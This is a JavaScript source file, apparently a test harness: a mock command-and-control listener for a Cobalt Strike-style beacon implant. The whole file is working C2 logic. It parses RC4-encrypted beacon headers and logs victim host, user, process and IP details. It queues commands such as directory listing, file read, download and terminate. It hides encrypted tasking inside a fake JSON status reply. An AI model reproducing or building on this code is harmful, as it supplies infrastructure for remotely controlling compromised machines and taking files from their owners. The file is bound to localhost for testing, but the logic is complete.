// mock_listener.js — minimal stock-beacon-listener server for tests.
// Implements: beat header parse (base64 -> RC4 encrypt_key -> BE unpack),
// session-key learn at registration, response template splice
// (RC4(sessionKey, LE taskstream) raw at the marker), task queue from
// --tasks <ndjson file> (one task per line, drained per tick), reply decode
// + print.
//
// Task line: {"cmd":4} (pwd) | {"cmd":14,"path":"."} (ls) | {"cmd":24,"path":..}
//   {"cmd":21,"sub":1,"sleep":10,"jitter":5} | {"cmd":10,"method":0} (terminate)
//   {"cmd":32,"path":..,"fileId":7} (download) | {"cmd":27,"path":..} (mkdir)
const http = require('http');
const fs = require('fs');
const { rc4 } = require('../src/rc4');
const { Unpacker } = require('../src/packer');

const PORT = parseInt(process.env.LISTEN_PORT || '0', 10) || 0;
const KEY = Buffer.from(process.env.LISTEN_KEY || '00112233445566778899aabbccddeeff', 'hex');
const PRE = '{"status": "ok", "data": "';
const POST = '","metrics": "sync"}';
const HB = process.env.LISTEN_HB || 'X-Request-Id';
const TASKS_FILE = process.argv.includes('--tasks') ? process.argv[process.argv.indexOf('--tasks') + 1] : null;

const sessions = new Map(); // agentId(u32) -> { key: Buffer, info }
let taskSeq = 0x1000;

function packTaskLE(t) {
  const parts = [];
  const u32 = (v) => { const b = Buffer.allocUnsafe(4); b.writeUInt32LE(v >>> 0, 0); parts.push(b); };
  const str = (s) => { const b = Buffer.from(String(s), 'utf8'); u32(b.length + 1); parts.push(b, Buffer.from([0])); };
  u32(t.cmd);
  if (t.cmd === 14 || t.cmd === 24 || t.cmd === 27) str(t.path || '.');
  if (t.cmd === 32) { str(t.path); u32(t.fileId || 7); }
  if (t.cmd === 21) { u32(t.sub); if (t.sub === 1) { u32(t.sleep); u32(t.jitter); } if (t.sub === 3 || t.sub === 4) u32(t.value || 0); }
  if (t.cmd === 10) u32(t.method || 0);
  u32(++taskSeq);
  return Buffer.concat(parts);
}

function drainTasks() {
  if (!TASKS_FILE || !fs.existsSync(TASKS_FILE)) return Buffer.alloc(0);
  const lines = fs.readFileSync(TASKS_FILE, 'utf8').split('\n').filter((l) => l.trim());
  fs.writeFileSync(TASKS_FILE, '');
  const tasks = lines.map((l) => packTaskLE(JSON.parse(l)));
  const payload = Buffer.concat(tasks);
  const size = Buffer.allocUnsafe(4); size.writeUInt32LE(payload.length, 0);
  return Buffer.concat([size, payload]);
}

function decodeReplies(rawBody, key) {
  if (!rawBody || !rawBody.length) return;
  const dec = rc4(rawBody, key); // body arrives RC4(sessionKey)-encrypted
  if (dec.length < 4) return;
  const total = dec.readUInt32BE(0);
  let pos = 4;
  const end = Math.min(dec.length, total);
  while (pos + 8 <= end) {
    const taskId = dec.readUInt32BE(pos); pos += 4;
    const cmd = dec.readUInt32BE(pos); pos += 4;
    // print what we can; known layouts get string extraction
    let note = '';
    try {
      if (cmd === 4) { const n = dec.readUInt32BE(pos); note = 'cwd=' + dec.subarray(pos + 4, pos + 4 + n).toString('utf8'); }
      else if (cmd === 27) { const n = dec.readUInt32BE(pos); note = 'mkdir=' + dec.subarray(pos + 4, pos + 4 + n).toString('utf8'); }
      else if (cmd === 24) { const n = dec.readUInt32BE(pos); const p = dec.subarray(pos + 4, pos + 4 + n).toString('utf8'); note = 'cat=' + p; }
      else if (cmd === 21) note = 'profile sub=' + dec.readUInt32BE(pos);
      else if (cmd === 14) note = 'ls ok=' + dec[pos];
      else if (cmd === 32) note = 'download fid=' + dec.readUInt32BE(pos) + ' state=' + dec[pos + 4];
      else if (cmd === 10) note = 'terminated';
    } catch (_) {}
    console.log(`[reply] task=0x${taskId.toString(16)} cmd=${cmd} ${note}`);
    pos = end; // we don't walk mixed frames precisely — tests use one task per tick
    break;
  }
}

const srv = http.createServer((req, res) => {
  const hb = req.headers[HB.toLowerCase()];
  if (!hb) { res.statusCode = 404; return res.end('not found'); }
  let plain;
  try { plain = rc4(Buffer.from(String(hb), 'base64'), KEY); } catch (_) { res.statusCode = 404; return res.end('not found'); }
  let agentId, sessionKey;
  try {
    const u = new Unpacker(plain);
    const agentType = u.u32();
    agentId = u.u32();
    u.u32(); u.u32(); u.u32(); u.u32();        // sleep jitter kill working
    u.u16(); u.u16();                          // acp oemcp
    u.u8();                                    // gmt
    const pid = u.u16(); u.u16();              // pid tid
    const build = u.u32();
    const major = u.u8(); const minor = u.u8();
    const ip = u.u32();
    u.u8();                                    // flag
    sessionKey = u.bytes();
    const domain = u.str(), computer = u.str(), user = u.str(), proc = u.str();
    if (!sessions.has(agentId)) {
      sessions.set(agentId, { key: sessionKey });
      console.log(`[reg] NEW agent id=${agentId.toString(16)} type=0x${agentType.toString(16)} ${computer} user=${user} proc=${proc} pid=${pid} os=${major}.${minor}.${build} ip=0x${ip.toString(16)}`);
    }
  } catch (e) { res.statusCode = 404; return res.end('bad beat'); }

  const chunks = [];
  req.on('data', (c) => chunks.push(c));
  req.on('end', () => {
    const body = Buffer.concat(chunks);
    if (body.length) decodeReplies(body, sessions.get(agentId).key);
    const tasks = drainTasks();
    const blob = rc4(tasks, sessions.get(agentId).key);
    res.statusCode = 200;
    res.setHeader('Content-Type', 'application/json');
    // splice RAW bytes — res.end(string) would utf8-encode and corrupt the blob
    res.end(Buffer.concat([Buffer.from(PRE, 'latin1'), blob, Buffer.from(POST, 'latin1')]));
  });
});
srv.listen(PORT, '127.0.0.1', () => console.log('[mock] listening :' + srv.address().port));
